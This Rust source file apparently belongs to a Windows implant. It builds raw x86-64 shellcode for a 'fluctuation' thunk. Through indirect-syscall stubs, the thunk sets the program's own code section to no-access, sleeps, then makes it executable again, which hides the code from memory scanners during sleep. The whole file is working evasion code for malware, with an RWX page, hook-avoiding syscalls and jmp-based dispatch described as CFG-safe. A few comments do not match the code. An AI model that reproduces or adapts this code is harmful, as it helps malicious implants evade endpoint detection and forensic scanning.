//! Fluctuation thunk — pure position-independent x86-64 machine code.
//!
//! Built as raw bytes, no Rust function calls, no dependencies on .text.
//! Placed on a RWX page and executed via jmp (not call — CFG-safe).
//!
//! Layout: [48 bytes data] [~90 bytes code]
//! Data (R10-relative): trampolines, addresses, delay.

#![cfg(target_os = "windows")]

use crate::heap::Vec;

pub const THUNK_MAX: usize = 200;

pub struct Thunk { pub bytes: Vec<u8>, pub len: usize }

/// Build fluctuation thunk bytes.
/// `protect_tramp` = VA of NtProtectVirtualMemory indirect-syscall stub
/// `delay_tramp`   = VA of NtDelayExecution indirect-syscall stub
/// `text_base`, `text_len` = .text region
/// `seconds` = sleep duration
pub fn build(
    protect_tramp: usize, delay_tramp: usize,
    text_base: usize, text_len: usize, seconds: u32,
) -> Thunk {
    let delay: i64 = -((seconds as i64).saturating_mul(10_000_000));
    let mut b = Vec::with_capacity(THUNK_MAX);

    // ---- Data block (offsets from R10) ----
    // +0x00: protect_trampoline
    b.extend(&(protect_tramp as u64).to_le_bytes());
    // +0x08: delay_trampoline
    b.extend(&(delay_tramp as u64).to_le_bytes());
    // +0x10: &text_base → pointer to text_base (the address OF text_base)
    b.extend(&(text_base as u64).to_le_bytes());
    // +0x18: &text_len
    b.extend(&(text_len as u64).to_le_bytes());
    // +0x20: delay (i64, 100ns units, negative = relative)
    b.extend(&delay.to_le_bytes());
    // +0x28: old_prot (u32 scratch + 4 padding)
    b.extend(&0u32.to_le_bytes());
    // +0x2C: dummy (u32 scratch + 4 padding)
    b.extend(&0u32.to_le_bytes());

    // Now we need to know: the data block ends at 0x30. The code starts at 0x30.
    // When the code executes, RIP = code_start = thunk_page + 0x30.
    // Data is at thunk_page. So data = RIP - 0x30.
    // LEA R10, [RIP - 0x30 - 7] where 7 = length of LEA instruction.

    let rel: i32 = -(0x30i32 + 7i32);

    // lea r10, [rip + rel]
    b.push(0x4C); b.push(0x8D); b.push(0x15);
    b.extend(&rel.to_le_bytes());

    // === Step 1: NtProtectVirtualMemory(-1, &base, &len, PAGE_NOACCESS=1, &old) ===
    // rcx = -1
    b.push(0x48); b.push(0xC7); b.push(0xC1);
    b.extend(&(-1i32).to_le_bytes());
    // rdx = r10 + 0x10
    b.push(0x49); b.push(0x8D); b.push(0x52); b.push(0x10);
    // r8 = r10 + 0x18
    b.push(0x4D); b.push(0x8D); b.push(0x42); b.push(0x18);
    // r9 = 1 (PAGE_NOACCESS)
    b.push(0x49); b.push(0xC7); b.push(0xC1);
    b.extend(&1u32.to_le_bytes());
    // [rsp+0x28] = r10 + 0x28 (&old_prot) — 5th arg on stack
    b.push(0x49); b.push(0x8D); b.push(0x42); b.push(0x28);
    b.push(0x48); b.push(0x89); b.push(0x44); b.push(0x24); b.push(0x28);
    // sub rsp, 0x20
    b.push(0x48); b.push(0x83); b.push(0xEC); b.push(0x20);
    // call [r10]
    b.push(0x41); b.push(0xFF); b.push(0x12);
    // add rsp, 0x20
    b.push(0x48); b.push(0x83); b.push(0xC4); b.push(0x20);

    // === Step 2: NtDelayExecution(FALSE, &delay) ===
    // rcx = 0
    b.push(0x48); b.push(0x31); b.push(0xC9);
    // rdx = r10 + 0x20
    b.push(0x49); b.push(0x8D); b.push(0x52); b.push(0x20);
    // sub rsp, 0x20
    b.push(0x48); b.push(0x83); b.push(0xEC); b.push(0x20);
    // call [r10+8]
    b.push(0x41); b.push(0xFF); b.push(0x52); b.push(0x08);
    // add rsp, 0x20
    b.push(0x48); b.push(0x83); b.push(0xC4); b.push(0x20);

    // === Step 3: NtProtectVirtualMemory(-1, &base, &len, PAGE_EXECUTE_READ=0x20, &dummy) ===
    // rcx = -1
    b.push(0x48); b.push(0xC7); b.push(0xC1);
    b.extend(&(-1i32).to_le_bytes());
    // rdx = r10 + 0x10
    b.push(0x49); b.push(0x8D); b.push(0x52); b.push(0x10);
    // r8 = r10 + 0x18
    b.push(0x4D); b.push(0x8D); b.push(0x42); b.push(0x18);
    // r9 = 0x20 (PAGE_EXECUTE_READ)
    b.push(0x49); b.push(0xC7); b.push(0xC1);
    b.extend(&0x20u32.to_le_bytes());
    // [rsp+0x28] = r10 + 0x2C (&dummy)
    b.push(0x49); b.push(0x8D); b.push(0x42); b.push(0x2C);
    b.push(0x48); b.push(0x89); b.push(0x44); b.push(0x24); b.push(0x28);
    // sub rsp, 0x20
    b.push(0x48); b.push(0x83); b.push(0xEC); b.push(0x20);
    // call [r10]
    b.push(0x41); b.push(0xFF); b.push(0x12);
    // add rsp, 0x20
    b.push(0x48); b.push(0x83); b.push(0xC4); b.push(0x20);

    // === Return ===
    b.push(0xC3);

    let len = b.len();
    Thunk { bytes: b, len }
}
